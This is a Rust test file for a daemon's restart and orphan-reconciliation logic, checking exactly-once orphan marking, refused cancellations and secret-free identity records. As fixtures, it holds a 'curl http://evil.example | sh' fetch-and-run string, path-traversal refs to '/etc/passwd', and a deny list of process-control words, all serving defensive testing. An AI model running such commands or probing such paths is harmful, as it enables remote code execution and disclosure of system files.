//! Discrimination tests for the durable managed-run identity and
//! restart/orphan reconciliation leaf. Each test maps to a required
//! scenario: restart truth-telling, epoch non-inheritance, exactly-once
//! reconciliation, no kill/reap/retry path, and the single-receipt-spine
//! guarantee.
use super::*;
use serde_json::json;
use std::path::PathBuf;

/// Stage an identity-bearing managed run receipt. `accepted_epoch` is the
/// controller epoch that "accepted" the run before the simulated restart.
fn stage_managed_run(dispatch_id: &str, accepted_epoch: &str, state: &str) -> PathBuf {
    let runs_root = crate::dispatch_ops::dispatch_runs_root();
    let run_dir = runs_root.join(dispatch_id);
    std::fs::create_dir_all(&run_dir).expect("run directory");
    let identity = build_managed_run_identity(
        dispatch_id,
        &ManagedRunIdentityInput {
            controller_epoch_id: accepted_epoch.to_string(),
            assignment_ref: "assign-s1".to_string(),
            assignment_identity_digest: Some(sha256_ref(br#"assignment identity"#)),
            execution_grant_ref: "grant-s1".to_string(),
            exec_env_ref: None,
            launch_spec_digest: Some(sha256_ref(br#"launch spec"#)),
            backend_name: "custom".to_string(),
            backend_metadata_digest: None,
        },
        3,
    );
    let mut status = json!({
        "dispatch_id": dispatch_id,
        "state": state,
        "status_revision": 3,
        "execution_classification": "managed_custom",
        "lifecycle_owner": "memory_server_managed_custom",
        "project": "s1-epoch-tests",
    });
    status
        .as_object_mut()
        .expect("status object")
        .insert("managed_run_identity".to_string(), identity);
    std::fs::write(
        run_dir.join("status.json"),
        serde_json::to_vec_pretty(&status).expect("serialize staged receipt"),
    )
    .expect("write staged receipt");
    run_dir
}

fn test_env() -> (tempfile::TempDir, tempfile::TempDir) {
    (
        tempfile::tempdir().expect("home"),
        tempfile::tempdir().expect("runs"),
    )
}

fn read_status(run_dir: &std::path::Path) -> Value {
    serde_json::from_slice(
        &std::fs::read(run_dir.join("status.json")).expect("read canonical receipt"),
    )
    .expect("canonical receipt JSON")
}

/// Required discrimination 1 + 2: a nonterminal run accepted under epoch A
/// is reconciled exactly once by epoch B, and epoch C neither duplicates the
/// orphan transition nor creates a replacement worker.
#[tokio::test]
async fn restart_orphans_nonterminal_managed_run_exactly_once() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let dispatch_id = "20260829T120001Z-s1-restart-once";
    stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    let run_dir = crate::dispatch_ops::dispatch_runs_root().join(dispatch_id);
    std::fs::write(run_dir.join("result.md"), b"evidence").expect("durably published artifact");

    // Epoch B incarnation: the daemon serve startup runs reconciliation
    // beside orphan recovery (fenced by the daemon singleton, never from a
    // bare constructor).
    let epoch_b_server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&epoch_b_server);
    let outcome_b = epoch_b_server
        .startup_reconciliation
        .get()
        .expect("startup reconciliation recorded")
        .clone();
    assert_eq!(
        outcome_b.orphaned,
        vec![dispatch_id.to_string()],
        "epoch B must orphan the foreign-epoch nonterminal run"
    );

    let status = read_status(&run_dir);
    let transitions = status["managed_run_reconciliation"]["transitions"]
        .as_array()
        .expect("transitions array");
    assert_eq!(transitions.len(), 1, "exactly one orphan transition");
    assert_eq!(
        transitions[0]["verdict"], "orphaned_control_unavailable",
        "typed orphan/control-unavailable verdict"
    );
    assert_eq!(
        transitions[0]["accepted_controller_epoch_id"], "ctrl-epoch-a",
        "the accepting epoch is preserved as evidence"
    );
    assert_eq!(
        transitions[0]["reconciling_controller_epoch_id"], epoch_b_server.controller_epoch,
        "the reconciling epoch is recorded"
    );
    assert_eq!(transitions[0]["prior_state"], "TASK_STATE_WORKING");
    assert_eq!(transitions[0]["control_state"], "unavailable");
    assert_eq!(
        status["state"], "TASK_STATE_WORKING",
        "reconciliation must not fabricate a terminal or running classification"
    );
    assert_eq!(
        status["status_revision"].as_u64(),
        Some(4),
        "the append is revision-bound: exactly one revision advance"
    );
    assert_eq!(
        status["managed_run_identity"]["controller_epoch_id"], "ctrl-epoch-a",
        "prior identity is never rewritten"
    );

    // Epoch C incarnation: no duplicate transition, no new worker.
    let before_epoch_c = std::fs::read_dir(&run_dir).expect("list run dir").count();
    let epoch_c_server =
        crate::MemoryServer::new(home.path().join("server2.sqlite"), None).expect("epoch C server");
    record_startup_reconciliation(&epoch_c_server);
    let outcome_c = epoch_c_server
        .startup_reconciliation
        .get()
        .expect("startup reconciliation recorded")
        .clone();
    assert!(
        outcome_c.orphaned.is_empty(),
        "epoch C must not duplicate the orphan transition"
    );
    let after = read_status(&run_dir);
    assert_eq!(
        after["managed_run_reconciliation"]["transitions"]
            .as_array()
            .expect("transitions")
            .len(),
        1,
        "still exactly one orphan transition after epoch C"
    );
    assert_eq!(
        std::fs::read_dir(&run_dir).expect("list run dir").count(),
        before_epoch_c,
        "epoch C created no replacement run artifacts or workers"
    );
    assert!(
        epoch_c_server
            .startup_reconciliation
            .get()
            .expect("outcome")
            .append_failures
            .is_empty(),
        "no append failures"
    );
}

/// Required discrimination 3: a run that reached terminal before the restart
/// stays terminal; no orphan observation is appended.
#[tokio::test]
async fn terminal_run_before_restart_is_never_reconciled() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let dispatch_id = "20260829T120002Z-s1-terminal-stays";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_COMPLETED");
    let before = std::fs::read(run_dir.join("status.json")).expect("read before");

    let server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("startup reconciliation recorded")
        .clone();
    assert!(
        outcome.orphaned.is_empty(),
        "terminal runs are never reopened or orphaned"
    );
    assert_eq!(
        std::fs::read(run_dir.join("status.json")).expect("read after"),
        before,
        "terminal receipt remains byte-terminal"
    );
}

/// Required discrimination 4: cancellation of a nonterminal foreign-epoch run
/// returns the typed unavailable receipt with zero OS side effect and zero
/// receipt mutation.
#[cfg(unix)]
#[tokio::test]
#[allow(clippy::await_holding_lock)] // serializes process-global env through the env-restore guards
async fn cancel_after_restart_is_unavailable_with_zero_side_effect() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let dispatch_id = "20260829T120003Z-s1-cancel-foreign-epoch";
    stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    let server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&server);
    let run_dir = crate::dispatch_ops::dispatch_runs_root().join(dispatch_id);
    let before = std::fs::read(run_dir.join("status.json")).expect("read before cancel");
    let revision = read_status(&run_dir)["status_revision"]
        .as_u64()
        .expect("revision");

    let response =
        crate::managed_run_control::request_managed_custom_cancel(&server, dispatch_id, revision)
            .await
            .expect("typed unavailable response");
    let receipt: Value =
        serde_json::from_str(&response).expect("response is canonical receipt JSON");
    assert_eq!(receipt["receipt"], "cancellation_unavailable");
    assert_eq!(
        receipt["reason"], "controller_epoch_mismatch",
        "epoch non-inheritance must be typed, not a generic absence"
    );
    for forbidden in ["pid", "pgid", "signal", "command", "cwd", "env"] {
        assert!(
            receipt.get(forbidden).is_none(),
            "cancellation receipt leaked process-control key {forbidden}"
        );
    }
    assert_eq!(
        std::fs::read(run_dir.join("status.json")).expect("read after cancel"),
        before,
        "the refused cancellation must not write anything to the receipt"
    );
}

/// Required discrimination 5 + 7: no retry/redispatch and no ExecEnv/worktree
/// cleanup happen merely because the controller epoch changed — the runs root
/// grows no new dispatch directories and existing run artifacts are
/// untouched.
#[tokio::test]
async fn restart_never_redispatches_or_cleans() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let dispatch_id = "20260829T120004Z-s1-no-redispatch";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    std::fs::write(run_dir.join("result.md"), b"published evidence").expect("artifact");
    let runs_root = crate::dispatch_ops::dispatch_runs_root();
    let mut before: Vec<(String, Vec<u8>)> = std::fs::read_dir(&runs_root)
        .expect("list runs root")
        .filter_map(Result::ok)
        .map(|entry| {
            let name = entry.file_name().to_string_lossy().to_string();
            let payload = if entry.path().is_dir() {
                std::fs::read(entry.path().join("status.json")).unwrap_or_default()
            } else {
                std::fs::read(entry.path()).unwrap_or_default()
            };
            (name, payload)
        })
        .collect();
    before.sort();

    let server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("startup reconciliation recorded")
        .clone();
    assert_eq!(outcome.orphaned.len(), 1);

    let mut after: Vec<(String, Vec<u8>)> = std::fs::read_dir(&runs_root)
        .expect("list runs root")
        .filter_map(Result::ok)
        .map(|entry| {
            let name = entry.file_name().to_string_lossy().to_string();
            let payload = if entry.path().is_dir() {
                std::fs::read(entry.path().join("status.json")).unwrap_or_default()
            } else {
                std::fs::read(entry.path()).unwrap_or_default()
            };
            (name, payload)
        })
        .collect();
    after.sort();
    assert_eq!(
        before.len(),
        after.len(),
        "restart must not create replacement dispatch directories"
    );
    assert_eq!(
        before.iter().map(|(name, _)| name).collect::<Vec<_>>(),
        after.iter().map(|(name, _)| name).collect::<Vec<_>>(),
        "no redispatch, no new run"
    );
    let result_after =
        std::fs::read(run_dir.join("result.md")).expect("published artifact still present");
    assert_eq!(
        result_after, b"published evidence",
        "durably published evidence is never cleaned up by reconciliation"
    );
}

/// Required discrimination 8: artifacts referenced before the restart remain
/// referenced and readable; the read projection exposes execution state,
/// control state, controller epoch, reconciliation state, and artifact
/// availability as separate facts.
#[tokio::test]
#[allow(clippy::await_holding_lock)] // serializes process-global env through the env-restore guards
async fn read_projection_after_restart_separates_execution_control_and_artifacts() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let dispatch_id = "20260829T120005Z-s1-projection";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    std::fs::write(run_dir.join("result.md"), b"evidence").expect("artifact");
    let server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&server);

    // The canonical receipt read stays verbatim — no projection key is
    // written into the durable bytes — and the projection is computed from
    // that SAME snapshot, never from a second read.
    let raw = crate::staffing_ops::staff_status(
        &server,
        crate::staffing_ops::StaffStatusRequest {
            dispatch_id: dispatch_id.to_string(),
        },
    )
    .await
    .expect("staff status read");
    let status: Value = serde_json::from_str(&raw).expect("status JSON");
    assert!(
        status.get("read_projection").is_none(),
        "staff_status must return the canonical receipt verbatim"
    );
    let projection =
        crate::staffing_ops::staff_status_projection_from_receipt(&server, dispatch_id, &status);
    let projection = projection.expect("identity-bearing run has a projection");
    assert_eq!(
        projection["execution_state"], "orphaned",
        "a reconciled nonterminal run projects orphaned, never failed/cancelled/completed/running"
    );
    assert_eq!(
        projection["control_state"], "unavailable",
        "control state is a separate fact from execution state"
    );
    assert_eq!(projection["controller_epoch_id"], "ctrl-epoch-a");
    assert_eq!(
        projection["current_controller_epoch_id"], server.controller_epoch,
        "the reading epoch is exposed separately from the accepting epoch"
    );
    assert!(
        projection["reconciliation"]["transitions"]
            .as_array()
            .expect("transitions")
            .len()
            == 1,
        "reconciliation state is exposed"
    );
    assert_eq!(
        projection["artifacts_available"]["result.md"], true,
        "pre-restart published artifacts remain referenced and readable"
    );
    // The durable receipt itself is unchanged by the read.
    assert!(
        status.get("managed_run_reconciliation").is_some(),
        "reconciliation evidence lives in the receipt spine"
    );
}

/// Required discrimination 9: a stale pre-restart completion arriving through
/// the canonical writer after reconciliation must not erase the reconciliation
/// evidence, and a terminal state must never regress to orphaned.
#[tokio::test]
async fn stale_post_reconciliation_receipt_cannot_regress_state() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let dispatch_id = "20260829T120006Z-s1-stale-receipt";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    let server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&server);
    assert_eq!(
        server
            .startup_reconciliation
            .get()
            .expect("outcome")
            .orphaned
            .len(),
        1
    );

    // A stale epoch-A completion receipt lands after reconciliation, through
    // the ordinary canonical writer.
    crate::dispatch_ops::write_status_json(
        &run_dir,
        dispatch_id,
        false,
        None,
        None,
        "n/a",
        Some(0),
        None,
        None,
        None,
        Some(json!({ "state": "TASK_STATE_COMPLETED", "agent": "fake" })),
    );
    let status = read_status(&run_dir);
    assert_eq!(status["state"], "TASK_STATE_COMPLETED");
    assert!(
        status["managed_run_reconciliation"]["transitions"]
            .as_array()
            .expect("transitions preserved through the later canonical writer")
            .len()
            == 1,
        "the reconciliation observation is carried forward, never erased"
    );
    assert!(
        status["managed_run_identity"].is_object(),
        "the durable identity is carried forward, never erased"
    );
    let projection = read_projection(&status, &run_dir, &server.controller_epoch, false)
        .expect("projection for identity-bearing run");
    assert_eq!(
        projection["execution_state"], "TASK_STATE_COMPLETED",
        "terminal wins: the newer terminal state is never regressed to orphaned"
    );
    assert_eq!(projection["control_state"], "not_applicable");
}

/// Failure posture: receipts that cannot be parsed are counted and left
/// byte-identical; receipts whose identity contradicts themselves get a typed
/// `inconsistent` observation, never a guessed owner.
#[tokio::test]
async fn unreadable_and_inconsistent_records_fail_closed() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());

    let runs_root = crate::dispatch_ops::dispatch_runs_root();
    // (a) Unparsable receipt: counted, untouched.
    let corrupt_id = "20260829T120007Z-s1-corrupt";
    let corrupt_dir = runs_root.join(corrupt_id);
    std::fs::create_dir_all(&corrupt_dir).expect("run dir");
    std::fs::write(corrupt_dir.join("status.json"), b"{ not json").expect("corrupt receipt");
    let corrupt_before = std::fs::read(corrupt_dir.join("status.json")).expect("read corrupt");

    // (b) Contradictory identity: managed_run_id does not match dispatch_id.
    let mismatch_id = "20260829T120008Z-s1-mismatch";
    let mismatch_dir = runs_root.join(mismatch_id);
    std::fs::create_dir_all(&mismatch_dir).expect("run dir");
    let contradictory = json!({
        "dispatch_id": mismatch_id,
        "state": "TASK_STATE_WORKING",
        "status_revision": 7,
        "managed_run_identity": {
            "managed_run_id": "some-other-run",
            "controller_epoch_id": "ctrl-epoch-a",
        },
    });
    std::fs::write(
        mismatch_dir.join("status.json"),
        serde_json::to_vec_pretty(&contradictory).expect("serialize"),
    )
    .expect("write contradictory receipt");

    let server =
        crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("epoch B server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("startup reconciliation recorded")
        .clone();
    assert_eq!(
        outcome.unreadable.len(),
        1,
        "the unparsable receipt is counted"
    );
    assert_eq!(
        outcome.inconsistent.len(),
        1,
        "the contradictory receipt is typed inconsistent"
    );
    assert!(
        outcome.orphaned.is_empty(),
        "no guessed owner is produced for either"
    );
    assert_eq!(
        std::fs::read(corrupt_dir.join("status.json")).expect("read corrupt after"),
        corrupt_before,
        "unparsable receipts stay byte-identical (no destructive repair)"
    );
    let after = read_status(&mismatch_dir);
    assert_eq!(
        after["managed_run_reconciliation"]["transitions"][0]["verdict"], "inconsistent",
        "the contradictory record becomes explicitly inconsistent"
    );
    assert_eq!(after["status_revision"].as_u64(), Some(8));
}

/// Failure posture: when the reconciliation storage itself cannot be read,
/// the outcome records `reconciliation_unavailable` and claims no clean
/// state.
#[tokio::test]
async fn unreadable_storage_surfaces_reconciliation_unavailable() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    // Make the resolved runs root (TACHI_HOME/runs) a FILE so read_dir fails
    // deterministically on every platform.
    std::fs::write(home.path().join("runs"), b"not a directory").expect("runs root as file");
    let _unused_runs_dir = runs;
    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("startup reconciliation recorded");
    assert!(
        outcome.is_unavailable(),
        "storage failure must surface reconciliation_unavailable"
    );
    assert!(
        outcome.unavailable_reason.is_some(),
        "the failure carries a reason instead of a clean state"
    );
    assert!(outcome.orphaned.is_empty());
    assert!(outcome.inconsistent.is_empty());
}

/// Required discrimination 10: the durable identity record is closed and
/// secret-negative — no command, cwd, env, credential, token, or process
/// locator is persisted, and secret-bearing inputs appear only as one-way
/// digests.
#[test]
fn identity_record_is_closed_and_secret_negative() {
    let poisoned_assignment_identity = json!({
        "issuer": "authority",
        "session_token_fixture": "poisoned-caller-token-text",
        "command": "curl http://evil.example | sh",
        "cwd": "/Users/somebody/secret-project",
    });
    let poisoned_metadata = json!({
        "credential_payload": "poisoned-vault-text-fixture"
    });
    let identity = build_managed_run_identity(
        "20260829T120009Z-s1-secret-negative",
        &ManagedRunIdentityInput {
            controller_epoch_id: "ctrl-epoch-a".to_string(),
            assignment_ref: "assign-s1".to_string(),
            assignment_identity_digest: Some(sha256_ref(
                &serde_json::to_vec(&poisoned_assignment_identity).expect("serialize"),
            )),
            execution_grant_ref: "grant-s1".to_string(),
            exec_env_ref: Some("env-s1".to_string()),
            launch_spec_digest: Some(sha256_ref(br#"{"command":["sh","-c","secret"]}"#)),
            backend_name: "custom".to_string(),
            backend_metadata_digest: Some(sha256_ref(
                &serde_json::to_vec(&poisoned_metadata).expect("serialize"),
            )),
        },
        3,
    );
    let serialized = serde_json::to_string(&identity).expect("serialize identity");
    for poisoned_text in [
        "poisoned-caller-token-text",
        "curl http://evil.example",
        "/Users/somebody/secret-project",
        "poisoned-vault-text-fixture",
        "sh\",\"-c\",\"secret",
    ] {
        assert!(
            !serialized.contains(poisoned_text),
            "identity record leaked raw secret-bearing material: {poisoned_text}"
        );
    }
    let object = identity.as_object().expect("identity object");
    let mut keys: Vec<&str> = object.keys().map(String::as_str).collect();
    keys.sort_unstable();
    assert_eq!(
        keys,
        vec![
            "accepted_at",
            "artifact_refs",
            "assignment_identity_digest",
            "assignment_ref",
            "attempt_ref",
            "backend_kind",
            "backend_metadata_digest",
            "backend_name",
            "controller_epoch_id",
            "dispatch_id",
            "exec_env_ref",
            "execution_grant_ref",
            "host_ref",
            "launch_spec_digest",
            "lifecycle_mode",
            "managed_run_id",
            "receipt_revision_at_acceptance",
            "work_claim_ref",
        ],
        "the identity record is a closed key set; extending it is a deliberate act"
    );
    for forbidden_key in [
        "pid",
        "pgid",
        "command",
        "cwd",
        "env",
        "credential",
        "token",
        "signal",
        "handle",
    ] {
        assert!(
            !keys.contains(&forbidden_key),
            "identity record carries a process-control or secret key: {forbidden_key}"
        );
    }
    assert_eq!(object["work_claim_ref"], Value::Null);
    assert_eq!(object["attempt_ref"], Value::Null);
    assert_eq!(object["lifecycle_mode"], "TachiManagedBatch");
    assert_eq!(object["backend_kind"], "custom");
}

/// Required discrimination 11: same-daemon cancellation behavior is unchanged
/// while the original controller epoch is alive — a current-epoch
/// identity-bearing run still reaches the volatile registry control path.
#[cfg(unix)]
#[tokio::test]
#[allow(clippy::await_holding_lock)] // serializes process-global env through the env-restore guards
async fn same_epoch_identity_run_still_reaches_registry_control() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let _runs_env = crate::test_support::EnvRestore::set_path("TACHI_RUN_ROOT", runs.path());
    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    let dispatch_id = "20260829T120010Z-s1-same-epoch-cancel";
    let run_dir = stage_managed_run(
        dispatch_id,
        &server.controller_epoch.clone(),
        "TASK_STATE_WORKING",
    );
    let (receiver, _guard) = server
        .managed_run_controls
        .register(dispatch_id)
        .expect("register control");
    drop(receiver); // closed channel: the committed unavailable path

    let response =
        crate::managed_run_control::request_managed_custom_cancel(&server, dispatch_id, 3)
            .await
            .expect("same-epoch cancel proceeds into the registry path");
    let receipt: Value = serde_json::from_str(&response).expect("receipt JSON");
    assert_ne!(
        receipt["reason"], "controller_epoch_mismatch",
        "the current epoch must NOT be refused as a foreign epoch"
    );
    assert_eq!(
        receipt["reason"], "duplicate_or_closed_cancellation",
        "same-epoch cancellation behaves exactly as before this leaf"
    );
    assert_eq!(
        read_status(&run_dir)["cancellation"]["reason"],
        "duplicate_or_closed_cancellation",
        "the canonical unavailable receipt is committed as before"
    );
}

/// Required discrimination 12 + STOP-condition guard: one receipt spine, no
/// kill-shaped code path. The reconciliation module must contain no process
/// control, no spawn, no retry/redispatch, and no second storage — asserted
/// at source level so a future regression fails this test, not a daemon.
#[test]
fn reconciliation_module_has_no_kill_path_and_no_second_ledger() {
    let source = include_str!("../managed_run_epoch.rs");
    // Strip full-line comments (this module documents the laws it enforces;
    // the scan targets executable surface, not prose).
    let code: String = source
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .map(|line| line.split("//").next().unwrap_or(line))
        .collect::<Vec<_>>()
        .join("\n");
    let lowered = code.to_lowercase();
    for forbidden in [
        "kill",
        "killpg",
        "waitpid",
        "signal",
        "spawn",
        "std::process",
        "command::new",
        "with_global_store",
        "insert into",
        "sqlite",
        "pid",
        "pgid",
    ] {
        assert!(
            !lowered.contains(forbidden),
            "reconciliation module must never contain '{forbidden}': no kill/reap/spawn path, \
             no PID authority, no second ledger"
        );
    }
}

/// The managed-run identity stamps through the real start path with the
/// owning server's epoch and the closed secret-negative shape.
#[test]
fn mark_managed_custom_start_stamps_durable_identity() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let runs = tempfile::tempdir().expect("runs");
    let dispatch_id = "20260829T120011Z-s1-stamp-through-start";
    let run_dir = runs.path().join(dispatch_id);
    std::fs::create_dir_all(&run_dir).expect("run dir");
    std::fs::write(
        run_dir.join("status.json"),
        json!({
            "dispatch_id": dispatch_id,
            "state": "TASK_STATE_WORKING",
            "status_revision": 1,
        })
        .to_string(),
    )
    .expect("seed receipt");

    crate::managed_run_control::mark_managed_custom_start(
        &run_dir,
        dispatch_id,
        &ManagedRunIdentityInput {
            controller_epoch_id: "ctrl-epoch-current".to_string(),
            assignment_ref: "assign-9".to_string(),
            assignment_identity_digest: None,
            execution_grant_ref: "grant-9".to_string(),
            exec_env_ref: Some("env-9".to_string()),
            launch_spec_digest: Some(sha256_ref(br#"spec"#)),
            backend_name: "custom".to_string(),
            backend_metadata_digest: None,
        },
    )
    .expect("stamp classification and identity");
    let status = read_status(&run_dir);
    assert_eq!(status["execution_classification"], "managed_custom");
    assert_eq!(
        status["managed_run_identity"]["controller_epoch_id"],
        "ctrl-epoch-current"
    );
    assert_eq!(
        status["managed_run_identity"]["managed_run_id"],
        dispatch_id
    );
    assert_eq!(status["status_revision"].as_u64(), Some(2));
    assert_eq!(
        status["managed_run_identity"]["work_claim_ref"],
        Value::Null
    );
}

/// Read projection for a same-epoch run with a live control handle reports
/// running/available, and never fabricates a terminal classification.
#[test]
fn read_projection_running_and_unknown_for_same_epoch() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let dispatch_id = "20260829T120012Z-s1-live-projection";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-current", "TASK_STATE_WORKING");
    let status = read_status(&run_dir);

    let live = read_projection(&status, &run_dir, "ctrl-epoch-current", true).expect("projection");
    assert_eq!(live["execution_state"], "running");
    assert_eq!(live["control_state"], "available");

    // Same epoch but the live handle is gone (e.g. the owning task died
    // without reaching a terminal receipt): honest unknown/unavailable.
    let lost = read_projection(&status, &run_dir, "ctrl-epoch-current", false).expect("projection");
    assert_eq!(lost["execution_state"], "unknown");
    assert_eq!(lost["control_state"], "unavailable");

    // Runs without a durable identity keep the historical read shape.
    let bare = json!({ "dispatch_id": dispatch_id, "state": "TASK_STATE_WORKING" });
    assert!(
        read_projection(&bare, &run_dir, "ctrl-epoch-current", true).is_none(),
        "no projection for receipts without a durable identity record"
    );
}

/// Codex R2 finding 5 (fixed): a receipt whose reconciliation observation is
/// typed `inconsistent` must project `unknown`, never a guessed orphan.
#[test]
fn inconsistent_record_projects_unknown_not_orphaned() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let dispatch_id = "20260829T120013Z-s1-inconsistent-projection";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    // Corrupt the record's identity so reconciliation types it inconsistent.
    let mut status = read_status(&run_dir);
    status["managed_run_identity"]["managed_run_id"] = json!("some-other-run");
    std::fs::write(
        run_dir.join("status.json"),
        serde_json::to_vec_pretty(&status).expect("serialize"),
    )
    .expect("write contradictory receipt");
    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("outcome")
        .clone();
    assert_eq!(outcome.inconsistent.len(), 1, "typed inconsistent");

    let receipt = read_status(&run_dir);
    let projection =
        read_projection(&receipt, &run_dir, &server.controller_epoch, false).expect("projection");
    assert_eq!(
        projection["execution_state"], "unknown",
        "an inconsistent record projects unknown, never a guessed orphan"
    );
    assert_eq!(projection["control_state"], "unavailable");
}

/// Codex R2 finding 6 (fixed): artifact-ref consumption is confined to the
/// closed allowlist — a tampered traversal ref is never probed on disk.
#[test]
fn artifact_ref_consumption_is_confined_to_allowlist() {
    let runs = tempfile::tempdir().expect("runs");
    let dispatch_id = "20260829T120014Z-s1-allowlist";
    let run_dir = runs.path().join(dispatch_id);
    std::fs::create_dir_all(&run_dir).expect("run dir");
    let mut status = json!({
        "dispatch_id": dispatch_id,
        "state": "TASK_STATE_WORKING",
        "status_revision": 1,
        "managed_run_identity": {
            "managed_run_id": dispatch_id,
            "controller_epoch_id": "ctrl-epoch-current",
            "artifact_refs": ["result.md", "../../escaped-secret", "/etc/passwd", "subdir/plan.md"],
        },
    });
    let _ = &mut status;
    // Tampered refs must not be probed; only the allowlisted name is.
    let projection =
        read_projection(&status, &run_dir, "ctrl-epoch-current", false).expect("projection");
    let artifacts = projection["artifacts_available"]
        .as_object()
        .expect("artifacts");
    assert_eq!(
        artifacts.len(),
        1,
        "only allowlisted refs are probed: {artifacts:?}"
    );
    assert!(artifacts.contains_key("result.md"));
    assert!(
        !artifacts.contains_key("../../escaped-secret")
            && !artifacts.contains_key("/etc/passwd")
            && !artifacts.contains_key("subdir/plan.md"),
        "tampered or foreign refs are never probed"
    );
}

/// Codex R2 finding 4 (fixed): the pre-existing daemon-restart recovery must
/// never failed-ify a managed run carrying a durable identity record; its
/// posture after a lost controller belongs to S1 reconciliation. Ordinary
/// receipts keep the pre-existing recovery semantics unchanged.
#[test]
fn legacy_restart_recovery_skips_identity_bearing_managed_runs() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let runs_root = crate::dispatch_ops::dispatch_runs_root();

    // (a) Managed identity-bearing WORKING receipt without exit_code:
    // recovery must leave it byte-identical (S1 owns its posture).
    let managed_id = "20260829T120015Z-s1-recovery-skip";
    let managed_dir = stage_managed_run(managed_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    assert!(
        !read_status(&managed_dir).get("exit_code").is_some(),
        "fixture must exercise the missing-exit_code eligibility path"
    );
    let managed_before =
        std::fs::read(managed_dir.join("status.json")).expect("read managed receipt");

    // (b) Ordinary WORKING receipt without exit_code: pre-existing recovery
